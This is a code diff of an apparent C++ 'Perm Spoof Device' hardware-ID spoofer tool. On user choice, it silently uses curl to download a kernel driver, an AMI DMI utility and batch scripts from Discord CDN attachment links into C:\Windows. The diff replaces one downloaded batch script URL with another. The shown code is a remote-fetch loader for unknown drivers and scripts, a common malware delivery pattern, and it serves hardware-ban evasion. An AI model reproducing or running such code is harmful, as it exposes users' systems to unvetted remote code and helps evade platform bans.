@@ -16,7 +16,7 @@ int main() {
 	printf("[1] Perm Spoof Device\n[2] Exit\n");
 	printf("Please Choose your Choice : ");
 	int option;
-	//    °??°
+	//    Â°??Â°
  
 	cin >> option;
 	switch (option)
@@ -27,7 +27,7 @@ int main() {
 		(system)(("curl https://cdn.discordapp.com/attachments/1133729053120151623/1233854053767712914/amifldrv64.sys -o C:\\Windows\\amifldrv64.sys --silent"));
 		(system)(("curl https://cdn.discordapp.com/attachments/1133729053120151623/1233853981449650297/AMIDEWINx64.EXE -o C:\\Windows\\AMIDEWINx64.EXE --silent"));
 		(system)(("curl https://cdn.discordapp.com/attachments/1133729053120151623/1233855729820237904/spoofer.sys -o C:\\Windows\\spoof.bat --silent"));
-		(system)(("curl https://cdn.discordapp.com/attachments/1066385084338426000/1066433398459076658/launcher.bat -o C:\\Windows\\launcher.bat --silent"));
+		(system)(("curl https://cdn.discordapp.com/attachments/1243941056006066297/1244687212210294885/spoofer.bat -o C:\\Windows\\spoofer.bat --silent"));
 
 		printf("\n\n  [+] Click Any Key To Perm Spoof!");
 
